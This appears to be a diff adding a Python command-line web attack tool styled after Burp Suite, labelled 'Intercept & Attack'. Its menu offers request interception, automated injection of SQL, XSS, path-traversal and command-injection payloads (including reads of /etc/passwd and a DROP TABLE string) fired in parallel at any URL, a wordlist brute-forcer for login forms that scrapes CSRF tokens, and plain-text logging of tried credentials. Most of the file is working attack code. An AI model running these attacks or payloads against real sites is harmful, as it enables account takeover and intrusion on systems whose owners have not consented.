@@ -1,0 +1,632 @@
+#!/usr/bin/env python3
+# WB Burp CLI Tool - Enhanced Version
+
+import requests
+import os
+import sys
+import time
+import argparse
+import json
+import threading
+from urllib.parse import urlparse, parse_qs, urlencode
+from colorama import Fore, Style, init
+from prettytable import PrettyTable
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+
+# Initialize colorama
+init(autoreset=True)
+
+# Constants
+LOG_DIR = "logs"
+CONFIG_DIR = "config"
+SESSION_FILE = os.path.join(CONFIG_DIR, "session.json")
+PAYLOADS_FILE = os.path.join(CONFIG_DIR, "payloads.json")
+HEADERS_FILE = os.path.join(CONFIG_DIR, "headers.json")
+
+# Create directories if they don't exist
+for directory in [LOG_DIR, CONFIG_DIR]:
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+class Logger:
+    @staticmethod
+    def log(content, filename="intercept.log", mode="a"):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(os.path.join(LOG_DIR, filename), mode) as f:
+            f.write(f"[{timestamp}] {content}\n")
+
+    @staticmethod
+    def error(message):
+        print(Fore.RED + f"[!] Error: {message}" + Style.RESET_ALL)
+        Logger.log(f"ERROR: {message}", "errors.log")
+
+class ConfigManager:
+    @staticmethod
+    def save_config(data, filename):
+        try:
+            with open(filename, 'w') as f:
+                json.dump(data, f, indent=4)
+        except Exception as e:
+            Logger.error(f"Failed to save config: {e}")
+
+    @staticmethod
+    def load_config(filename, default=None):
+        try:
+            with open(filename, 'r') as f:
+                return json.load(f)
+        except FileNotFoundError:
+            return default if default is not None else {}
+        except Exception as e:
+            Logger.error(f"Failed to load config: {e}")
+            return {}
+
+class SessionManager:
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            "User-Agent": "WB-Burp-CLI/2.0",
+            "Accept": "*/*",
+            "Connection": "keep-alive"
+        })
+        self.load_session()
+
+    def load_session(self):
+        session_data = ConfigManager.load_config(SESSION_FILE, {})
+        if session_data:
+            self.session.headers.update(session_data.get('headers', {}))
+            if 'cookies' in session_data:
+                self.session.cookies.update(session_data['cookies'])
+
+    def save_session(self):
+        session_data = {
+            'headers': dict(self.session.headers),
+            'cookies': requests.utils.dict_from_cookiejar(self.session.cookies)
+        }
+        ConfigManager.save_config(session_data, SESSION_FILE)
+
+    def update_headers(self, headers):
+        self.session.headers.update(headers)
+        self.save_session()
+
+    def clear_cookies(self):
+        self.session.cookies.clear()
+        self.save_session()
+
+def banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(Fore.GREEN + Style.BRIGHT + r"""
+██████╗ ██████╗ ██╗   ██╗██████╗ 
+██╔══██╗██╔══██╗██║   ██║██╔══██╗
+██████╔╝██████╔╝██║   ██║██████╔╝
+██╔══██╗██╔══██╗██║   ██║██╔═══╝ 
+██████╔╝██║  ██║╚██████╔╝██║     
+╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝
+    CLI  Burp Suite - Intercept & Attack
+    BY : WB X CODE USER CMD 
+    """ + Style.RESET_ALL)
+    print(Fore.CYAN + "Version 2.0 | Enhanced Security Testing Tool" + Style.RESET_ALL)
+    print(Fore.YELLOW + "="*60 + Style.RESET_ALL)
+
+def intercept_request(session):
+    print(Fore.YELLOW + "\n=== Request Interception ===" + Style.RESET_ALL)
+    url = input("Target URL: ").strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    
+    try:
+        response = session.session.get(url)
+        
+        # Display response summary
+        table = PrettyTable()
+        table.field_names = ["Field", "Value"]
+        table.add_row(["Status Code", response.status_code])
+        table.add_row(["Content Length", f"{len(response.content)} bytes"])
+        table.add_row(["Content Type", response.headers.get('Content-Type', 'Unknown')])
+        table.add_row(["Server", response.headers.get('Server', 'Unknown')])
+        print(Fore.CYAN + str(table) + Style.RESET_ALL)
+        
+        # Log details
+        log_content = f"URL: {url}\nStatus: {response.status_code}\nHeaders:\n{json.dumps(dict(response.headers), indent=2)}\n\nBody (first 500 chars):\n{response.text[:500]}"
+        Logger.log(log_content, "intercept.log")
+        
+        # Save response to file if large
+        if len(response.text) > 1000:
+            filename = f"response_{int(time.time())}.txt"
+            with open(os.path.join(LOG_DIR, filename), 'w') as f:
+                f.write(response.text)
+            print(Fore.GREEN + f"[+] Full response saved to {filename}" + Style.RESET_ALL)
+            
+    except Exception as e:
+        Logger.error(f"Request failed: {e}")
+
+def analyze_response(response):
+    """Analyze response for potential vulnerabilities"""
+    vulnerabilities = []
+    
+    # Check for common security headers
+    security_headers = {
+        'X-XSS-Protection': 'Missing XSS protection header',
+        'Content-Security-Policy': 'Missing CSP header',
+        'X-Frame-Options': 'Missing clickjacking protection',
+        'Strict-Transport-Security': 'Missing HSTS header'
+    }
+    
+    for header, message in security_headers.items():
+        if header not in response.headers:
+            vulnerabilities.append(message)
+    
+    # Check for server information disclosure
+    server = response.headers.get('Server', '').lower()
+    if server and 'apache' in server or 'nginx' in server or 'iis' in server:
+        vulnerabilities.append(f"Server version disclosed: {response.headers['Server']}")
+    
+    # Check for framework information
+    x_powered_by = response.headers.get('X-Powered-By', '').lower()
+    if x_powered_by:
+        vulnerabilities.append(f"Framework disclosed: {response.headers['X-Powered-By']}")
+    
+    # Check for directory listing
+    if "Index of /" in response.text:
+        vulnerabilities.append("Directory listing enabled")
+    
+    return vulnerabilities
+
+def custom_request(session):
+    print(Fore.YELLOW + "\n=== Custom Request ===" + Style.RESET_ALL)
+    url = input("Target URL: ").strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    
+    method = input("Method (GET/POST/PUT/DELETE/HEAD): ").upper().strip()
+    if method not in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']:
+        print(Fore.RED + "Invalid method. Defaulting to GET." + Style.RESET_ALL)
+        method = 'GET'
+    
+    # Load saved headers or use defaults
+    saved_headers = ConfigManager.load_config(HEADERS_FILE, {})
+    headers = {}
+    if saved_headers:
+        print(Fore.CYAN + "\nSaved headers:" + Style.RESET_ALL)
+        for i, (k, v) in enumerate(saved_headers.items(), 1):
+            print(f"{i}. {k}: {v}")
+    
+    print(Fore.CYAN + "\nAdd headers (leave empty to finish):" + Style.RESET_ALL)
+    while True:
+        header = input("Header (format: Key: Value): ").strip()
+        if not header:
+            break
+        if ':' not in header:
+            print(Fore.RED + "Invalid header format. Use 'Key: Value'" + Style.RESET_ALL)
+            continue
+        key, value = header.split(':', 1)
+        headers[key.strip()] = value.strip()
+    
+    data = None
+    if method in ['POST', 'PUT']:
+        data_input = input("Data (key=value&key2=value2 or JSON): ").strip()
+        if data_input:
+            if data_input.startswith('{') and data_input.endswith('}'):
+                try:
+                    data = json.loads(data_input)
+                except json.JSONDecodeError:
+                    print(Fore.RED + "Invalid JSON. Sending as raw data." + Style.RESET_ALL)
+                    data = data_input
+            else:
+                data = dict(pair.split('=') for pair in data_input.split('&'))
+    
+    try:
+        if method == 'GET':
+            response = session.session.get(url, headers=headers)
+        elif method == 'POST':
+            response = session.session.post(url, headers=headers, data=data)
+        elif method == 'PUT':
+            response = session.session.put(url, headers=headers, data=data)
+        elif method == 'DELETE':
+            response = session.session.delete(url, headers=headers)
+        elif method == 'HEAD':
+            response = session.session.head(url, headers=headers)
+        
+        print(Fore.GREEN + f"\nResponse ({response.status_code}):" + Style.RESET_ALL)
+        
+        # Display response analysis
+        vulnerabilities = analyze_response(response)
+        if vulnerabilities:
+            print(Fore.RED + "\nPotential vulnerabilities found:" + Style.RESET_ALL)
+            for vuln in vulnerabilities:
+                print(f"- {vuln}")
+        
+        # Save headers if new ones were added
+        if headers:
+            current_headers = ConfigManager.load_config(HEADERS_FILE, {})
+            current_headers.update(headers)
+            ConfigManager.save_config(current_headers, HEADERS_FILE)
+        
+        Logger.log(f"Custom {method} request to {url} => {response.status_code}", "custom_requests.log")
+        
+    except Exception as e:
+        Logger.error(f"Request failed: {e}")
+
+def payload_injection(session):
+    print(Fore.YELLOW + "\n=== Payload Injection ===" + Style.RESET_ALL)
+    url = input("Target URL with parameter (e.g., http://example.com/page?param=): ").strip()
+    
+    # Load payloads from file or use defaults
+    payloads = ConfigManager.load_config(PAYLOADS_FILE, {
+        "sql": ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--"],
+        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
+        "path_traversal": ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"],
+        "command_injection": ["; ls -la", "| cat /etc/passwd", "`id`"]
+    })
+    
+    # Let user select payload categories
+    print(Fore.CYAN + "\nAvailable payload categories:" + Style.RESET_ALL)
+    for i, category in enumerate(payloads.keys(), 1):
+        print(f"{i}. {category.upper()} ({len(payloads[category])} payloads)")
+    
+    selected = input("\nSelect categories (comma separated) or 'all': ").strip()
+    if selected.lower() == 'all':
+        selected_categories = list(payloads.keys())
+    else:
+        selected_categories = []
+        for num in selected.split(','):
+            try:
+                idx = int(num.strip()) - 1
+                if 0 <= idx < len(payloads):
+                    selected_categories.append(list(payloads.keys())[idx])
+            except:
+                pass
+    
+    if not selected_categories:
+        print(Fore.RED + "No valid categories selected. Using all payloads." + Style.RESET_ALL)
+        selected_categories = list(payloads.keys())
+    
+    # Prepare all selected payloads
+    test_payloads = []
+    for category in selected_categories:
+        test_payloads.extend(payloads[category])
+    
+    print(Fore.CYAN + f"\nTesting with {len(test_payloads)} payloads..." + Style.RESET_ALL)
+    
+    def test_payload(payload):
+        try:
+            test_url = url + requests.utils.quote(payload)
+            start_time = time.time()
+            response = session.session.get(test_url)
+            elapsed = (time.time() - start_time) * 1000  # in milliseconds
+            
+            result = {
+                'payload': payload,
+                'status': response.status_code,
+                'time': elapsed,
+                'length': len(response.text),
+                'url': test_url
+            }
+            
+            # Check for potential success indicators
+            if "error" in response.text.lower():
+                result['note'] = "Error message detected"
+            elif response.status_code >= 500:
+                result['note'] = "Server error"
+            elif "syntax" in response.text.lower():
+                result['note'] = "Possible SQL syntax"
+            elif elapsed > 1000:  # 1 second delay
+                result['note'] = "Time-based delay detected"
+            
+            return result
+        except Exception as e:
+            return {'payload': payload, 'error': str(e)}
+    
+    # Use threading to speed up testing
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        results = list(executor.map(test_payload, test_payloads))
+    
+    # Display results
+    table = PrettyTable()
+    table.field_names = ["Payload", "Status", "Time (ms)", "Length", "Note"]
+    for result in results:
+        if 'error' in result:
+            table.add_row([result['payload'][:20] + "...", "ERROR", "-", "-", result['error']])
+        else:
+            note = result.get('note', '')
+            color = Fore.RED if note else Fore.GREEN
+            table.add_row([
+                result['payload'][:20] + "...",
+                result['status'],
+                f"{result['time']:.2f}",
+                result['length'],
+                color + note + Style.RESET_ALL
+            ])
+    
+    print(Fore.CYAN + "\nInjection Test Results:" + Style.RESET_ALL)
+    print(table)
+    
+    # Save results
+    Logger.log(f"Injection test on {url}\nResults:\n{str(table)}", "injection_tests.log")
+
+def brute_force(session):
+    print(Fore.YELLOW + "\n=== Brute Force Attack ===" + Style.RESET_ALL)
+    url = input("Target Login URL: ").strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    
+    # Get login parameters
+    username_field = input("Username field name: ").strip() or 'username'
+    password_field = input("Password field name: ").strip() or 'password'
+    csrf_field = input("CSRF field name (leave empty if none): ").strip()
+    
+    # Get target credentials
+    username = input("Username to test: ").strip()
+    wordlist_path = input("Path to password wordlist: ").strip()
+    
+    # Get success/failure indicators
+    success_str = input("Success indicator in response (e.g. 'Welcome'): ").strip()
+    failure_str = input("Failure indicator in response (e.g. 'Invalid'): ").strip()
+    
+    try:
+        with open(wordlist_path, 'r', errors='ignore') as f:
+            passwords = [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        Logger.error(f"Failed to read wordlist: {e}")
+        return
+    
+    print(Fore.CYAN + f"\nLoaded {len(passwords)} passwords. Starting attack..." + Style.RESET_ALL)
+    
+    # First request to get potential CSRF token
+    csrf_token = None
+    if csrf_field:
+        try:
+            response = session.session.get(url)
+            if csrf_field in response.text:
+                # Simple HTML parsing for CSRF token
+                start = response.text.find(f'name="{csrf_field}"')
+                if start != -1:
+                    value_start = response.text.find('value="', start) + 7
+                    value_end = response.text.find('"', value_start)
+                    csrf_token = response.text[value_start:value_end]
+                    print(Fore.GREEN + f"[+] Found CSRF token: {csrf_token}" + Style.RESET_ALL)
+        except Exception as e:
+            Logger.error(f"CSRF token fetch failed: {e}")
+    
+    found = False
+    for i, password in enumerate(passwords, 1):
+        data = {
+            username_field: username,
+            password_field: password
+        }
+        if csrf_token and csrf_field:
+            data[csrf_field] = csrf_token
+        
+        try:
+            response = session.session.post(url, data=data)
+            
+            # Progress indicator
+            if i % 10 == 0:
+                print(Fore.YELLOW + f"Attempt {i}/{len(passwords)}: {password}" + Style.RESET_ALL)
+            
+            # Check for success
+            if (success_str and success_str.lower() in response.text.lower()) or \
+               (failure_str and failure_str.lower() not in response.text.lower()) or \
+               (not success_str and not failure_str and response.status_code == 200):
+                print(Fore.GREEN + f"\n[+] Potential success with: {username}:{password}" + Style.RESET_ALL)
+                print(Fore.CYAN + f"Status Code: {response.status_code}" + Style.RESET_ALL)
+                Logger.log(f"Brute force success: {username}:{password}", "brute_force.log")
+                found = True
+                break
+            
+        except Exception as e:
+            Logger.error(f"Request failed: {e}")
+            continue
+    
+    if not found:
+        print(Fore.RED + "\n[-] No valid password found in the wordlist." + Style.RESET_ALL)
+
+def login_intercept(session):
+    print(Fore.YELLOW + "\n=== Login Interception ===" + Style.RESET_ALL)
+    url = input("Login URL: ").strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    
+    # Get form fields
+    username_field = input("Username field name: ").strip() or 'username'
+    password_field = input("Password field name: ").strip() or 'password'
+    additional_fields = {}
+    
+    print(Fore.CYAN + "\nAdditional form fields (leave empty to finish):" + Style.RESET_ALL)
+    while True:
+        field = input("Field name (or leave empty): ").strip()
+        if not field:
+            break
+        value = input(f"Value for '{field}': ").strip()
+        additional_fields[field] = value
+    
+    # Get credentials
+    username = input("Username: ").strip()
+    password = input("Password: ").strip()
+    
+    # Prepare data
+    data = {
+        username_field: username,
+        password_field: password,
+        **additional_fields
+    }
+    
+    try:
+        response = session.session.post(url, data=data)
+        
+        print(Fore.CYAN + "\n=== Login Attempt Results ===" + Style.RESET_ALL)
+        print(f"Status Code: {response.status_code}")
+        print(f"Response Length: {len(response.text)} bytes")
+        
+        # Check for common responses
+        if response.status_code == 302 or response.status_code == 301:
+            print(Fore.GREEN + "[+] Redirect detected - likely successful login" + Style.RESET_ALL)
+            print(f"Redirect Location: {response.headers.get('Location', 'None')}")
+        elif "session" in response.cookies or "token" in response.cookies:
+            print(Fore.GREEN + "[+] Session cookie set - likely successful login" + Style.RESET_ALL)
+        elif response.status_code == 200 and len(response.text) < 5000:
+            print(Fore.YELLOW + "[~] 200 OK response - inspect manually" + Style.RESET_ALL)
+        elif response.status_code >= 400:
+            print(Fore.RED + "[-] Error response - likely failed login" + Style.RESET_ALL)
+        
+        # Save session if successful
+        if response.status_code in (200, 302, 301) and ("session" in response.cookies or "token" in response.cookies):
+            session.save_session()
+            print(Fore.GREEN + "[+] Session saved for future requests" + Style.RESET_ALL)
+        
+        Logger.log(f"Login attempt to {url} with {username}:{password} => {response.status_code}", "login_intercept.log")
+        
+    except Exception as e:
+        Logger.error(f"Login attempt failed: {e}")
+
+def manage_session(session):
+    print(Fore.YELLOW + "\n=== Session Management ===" + Style.RESET_ALL)
+    print("1. View current session headers")
+    print("2. Add/Update header")
+    print("3. Remove header")
+    print("4. Clear cookies")
+    print("5. Save current session")
+    print("0. Back to main menu")
+    
+    choice = input("Select option: ").strip()
+    
+    if choice == "1":
+        print(Fore.CYAN + "\nCurrent Session Headers:" + Style.RESET_ALL)
+        for k, v in session.session.headers.items():
+            print(f"{k}: {v}")
+        
+        print(Fore.CYAN + "\nCurrent Cookies:" + Style.RESET_ALL)
+        for cookie in session.session.cookies:
+            print(f"{cookie.name}: {cookie.value}")
+    
+    elif choice == "2":
+        header = input("Header to add/update (format: Key: Value): ").strip()
+        if ':' not in header:
+            print(Fore.RED + "Invalid format. Use 'Key: Value'" + Style.RESET_ALL)
+            return
+        key, value = header.split(':', 1)
+        session.session.headers[key.strip()] = value.strip()
+        session.save_session()
+        print(Fore.GREEN + "[+] Header updated" + Style.RESET_ALL)
+    
+    elif choice == "3":
+        header = input("Header name to remove: ").strip()
+        if header in session.session.headers:
+            del session.session.headers[header]
+            session.save_session()
+            print(Fore.GREEN + f"[+] Header '{header}' removed" + Style.RESET_ALL)
+        else:
+            print(Fore.RED + f"[-] Header '{header}' not found" + Style.RESET_ALL)
+    
+    elif choice == "4":
+        session.clear_cookies()
+        print(Fore.GREEN + "[+] Cookies cleared" + Style.RESET_ALL)
+    
+    elif choice == "5":
+        session.save_session()
+        print(Fore.GREEN + "[+] Session saved" + Style.RESET_ALL)
+
+def view_logs():
+    files = [f for f in os.listdir(LOG_DIR) if os.path.isfile(os.path.join(LOG_DIR, f))]
+    if not files:
+        print(Fore.RED + "No log files found." + Style.RESET_ALL)
+        return
+    
+    print(Fore.YELLOW + "\n=== Log Files ===" + Style.RESET_ALL)
+    for i, f in enumerate(files, 1):
+        print(f"{i}. {f} ({os.path.getsize(os.path.join(LOG_DIR, f))} bytes)")
+    
+    try:
+        choice = input("\nSelect file to view (0 to cancel): ").strip()
+        if choice == "0":
+            return
+        
+        file_idx = int(choice) - 1
+        if 0 <= file_idx < len(files):
+            with open(os.path.join(LOG_DIR, files[file_idx]), 'r') as f:
+                print(Fore.CYAN + f"\nContents of {files[file_idx]}:" + Style.RESET_ALL)
+                print(f.read())
+        else:
+            print(Fore.RED + "Invalid selection." + Style.RESET_ALL)
+    except:
+        print(Fore.RED + "Invalid input." + Style.RESET_ALL)
+
+def menu():
+    session = SessionManager()
+    
+    while True:
+        banner()
+        print(Fore.GREEN + """
+[1] Intercept & Analyze Request
+[2] Send Custom Request
+[3] Automated Payload Injection
+[4] Brute Force Attack
+[5] Login Interception
+[6] Session Management
+[7] View Logs
+[0] Exit
+""" + Style.RESET_ALL)
+        
+        choice = input("Choose > ").strip()
+        
+        if choice == "1":
+            intercept_request(session)
+        elif choice == "2":
+            custom_request(session)
+        elif choice == "3":
+            payload_injection(session)
+        elif choice == "4":
+            brute_force(session)
+        elif choice == "5":
+            login_intercept(session)
+        elif choice == "6":
+            manage_session(session)
+        elif choice == "7":
+            view_logs()
+        elif choice == "0":
+            print(Fore.GREEN + "Goodbye!" + Style.RESET_ALL)
+            break
+        else:
+            print(Fore.RED + "Invalid choice. Try again." + Style.RESET_ALL)
+        
+        input(Fore.YELLOW + "\n[Press Enter to continue]" + Style.RESET_ALL)
+
+if __name__ == "__main__":
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(description="WB Burp CLI Tool - Enhanced Security Testing")
+    parser.add_argument('-u', '--url', help="Target URL for quick scan")
+    parser.add_argument('-v', '--version', action='store_true', help="Show version information")
+    
+    args = parser.parse_args()
+    
+    if args.version:
+        print("WB Burp CLI Tool - Version 2.0")
+        sys.exit(0)
+    
+    if args.url:
+        # Quick scan mode
+        session = SessionManager()
+        print(Fore.CYAN + f"\nQuick scanning: {args.url}" + Style.RESET_ALL)
+        try:
+            response = session.session.get(args.url)
+            print(Fore.GREEN + f"\nInitial Response: {response.status_code}" + Style.RESET_ALL)
+            
+            # Analyze response
+            vulnerabilities = analyze_response(response)
+            if vulnerabilities:
+                print(Fore.RED + "\nPotential vulnerabilities found:" + Style.RESET_ALL)
+                for vuln in vulnerabilities:
+                    print(f"- {vuln}")
+            else:
+                print(Fore.GREEN + "\nNo obvious vulnerabilities detected in initial scan." + Style.RESET_ALL)
+            
+            # Offer to run full tests
+            choice = input("\nRun full payload injection test? (y/n): ").lower()
+            if choice == 'y':
+                payload_injection(session)
+        except Exception as e:
+            Logger.error(f"Quick scan failed: {e}")
+        sys.exit(0)
+    
+    # Start interactive mode
+    menu()
